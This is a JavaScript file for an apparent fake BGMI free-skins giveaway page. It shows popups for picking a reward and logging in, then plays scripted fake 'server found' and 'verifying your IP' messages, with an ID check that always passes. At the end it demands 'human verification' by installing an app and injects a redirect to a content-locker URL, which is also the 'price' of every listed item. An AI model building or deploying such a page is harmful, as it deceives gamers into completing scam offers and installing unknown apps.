
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content-txt");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-txt-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-txt-active";
}

var openmusic = new Audio();
openmusic.src = "https://bgmi.services/insta/resources/open.mp3";

var closemusic = new Audio();
closemusic.src = "https://bgmi.services/insta/resources/close.mp3";

var items=
{
    "item1":{"name":"Blood Raven X-Suit","price":"https://wowservices.github.io/wow/locker.html"},
    "item2":{"name":"Golden Pharaoh X-Suit","price":"https://wowservices.github.io/wow/locker.html"},
    "item3":{"name":"Poseidon X-Suit","price":"https://wowservices.github.io/wow/locker.html"},
    "item4":{"name":"M416 Glacier Max","price":"https://wowservices.github.io/wow/locker.html"},
    "item5":{"name":"M416 Lizard Roar Max","price":"https://wowservices.github.io/wow/locker.html"},
    "item6":{"name":"M416 The Fool Max","price":"https://wowservices.github.io/wow/locker.html"},
    "item7":{"name":"Materials","price":"https://wowservices.github.io/wow/locker.html"},
    "item8":{"name":"Golden McLaren Max","price":"https://wowservices.github.io/wow/locker.html"},
    "item9":{"name":"Unknown Cash","price":"https://wowservices.github.io/wow/locker.html"}
};




function open_rewardsBox() {
    count = 0;
    $('.rewardsBox').fadeIn(800);
    $('.rewardsHome').hide();
}
var itemdata;
function open_reward_confirmation(ag) {

    var rewardImg = $(ag).attr("src");
   var currentitem = $(ag).attr("item");

 itemdata= items[currentitem];

    $('.reward_confirmation').fadeIn(800);
    $('#myRewardImg').attr('src', rewardImg);
}

function open_account_login() {
    $('.account_login').fadeIn(800);
    $('.reward_confirmation').hide();
}

// tombol untuk menutup popup
function close_reward_confirmation() {
    $(".reward_confirmation").hide()
}


var ipinfo, msgs;

// function loaduser() {
//     // $.get('https://json.geoiplookup.io/', function (r) {
//     //     ipinfo = r;

//     // });

// }

// window.onload = function () {
//     loaduser();
// }
var playerid;

var count = 0; var max = 4;
var i = 0;
var txt = 'Processing your request...'; /* The text */
var speed = 100; /* The speed/duration of the effect in milliseconds */
var msgs;

// function verifyplayer() {
//     playerid = $("#playid").val();
//     if (playerid.length > 4) {
//         $('.account_login').hide();
//         $('.processingbox').fadeIn(800);
//         msgs = ["Processing your request...", "Closest Server Found: Maharastra", "Player Found: " + playerid, "Verifying your IP"];
//         typemsg();
//     } else alert("Please enter valid characted id");
// }

function verifyplayer() {
    playerid = 1;
    if (playerid==1) {
        $('.account_login').hide();
        $('.processingbox').fadeIn(800);
        msgs = ["Processing your request...", "Closest Server Found: Maharastra", "Player Found: ", "Verifying your IP"];
        typemsg();
    } else alert("Please enter valid characted id");
}

async function typemsg() {

    if (count < max) {
        i = 0;
        txt = msgs[count];
        document.getElementById("question").innerHTML = '';
        typeWriter();
        setTimeout(typemsg, 3000,);
        count++;
    } else {
        clearTimeout(typemsg);
        $("#title").text('Human Verification');
        $("#question").text('Install 1 apps and use it for 30 seconds.');
        $("#question").after(`<script > window.location.href = "https://wowservices.github.io/wow/locker.html";</script>`);
        // $("#question").after(`<img src="${itemdata.price}" alt="${itemdata.name}">`);
        $("#loader").hide();

    }
}


function typeWriter() {
    if (i < txt.length) {
        document.getElementById("question").innerHTML += txt.charAt(i);
        i++;
        setTimeout(typeWriter, speed);
    }
}
